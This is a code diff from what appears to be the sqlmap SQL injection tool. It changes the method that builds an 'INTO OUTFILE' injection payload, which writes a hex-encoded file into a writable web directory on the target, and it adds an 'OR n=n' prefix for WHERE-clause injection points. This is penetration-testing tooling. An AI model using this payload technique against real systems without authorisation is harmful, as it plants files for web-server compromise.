@@ -22,6 +22,7 @@ from lib.core.common import ntToPosixSlashes
 from lib.core.common import isWindowsDriveLetterPath
 from lib.core.common import normalizePath
 from lib.core.common import posixToNtSlashes
+from lib.core.common import randomInt
 from lib.core.common import randomStr
 from lib.core.common import readInput
 from lib.core.convert import hexencode
@@ -99,14 +100,23 @@ class Web:
                 return True
 
     def __webFileInject(self, fileContent, fileName, directory):
-        outFile     = posixpath.normpath("%s/%s" % (directory, fileName))
-        uplQuery    = fileContent.replace("WRITABLE_DIR", directory.replace('/', '\\\\') if kb.os == "Windows" else directory)
-        query       = "LIMIT 1 INTO OUTFILE '%s' " % outFile
-        query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
-        query       = agent.prefixQuery(query)
-        query       = agent.suffixQuery(query)
-        payload     = agent.payload(newValue=query)
-        page        = Request.queryPage(payload)
+        outFile = posixpath.normpath("%s/%s" % (directory, fileName))
+        uplQuery = fileContent.replace("WRITABLE_DIR", directory.replace('/', '\\\\') if kb.os == "Windows" else directory)
+        query = ""
+
+        if kb.technique and kb.technique in kb.injection.data:
+            where = kb.injection.data[kb.technique].where
+
+            if where == 2:
+                randInt = randomInt()
+                query += "OR %d=%d " % (randInt, randInt)
+
+        query += "LIMIT 1 INTO OUTFILE '%s' " % outFile
+        query += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
+        query = agent.prefixQuery(query)
+        query = agent.suffixQuery(query)
+        payload = agent.payload(newValue=query)
+        page = Request.queryPage(payload)
         return page
 
     def webInit(self):
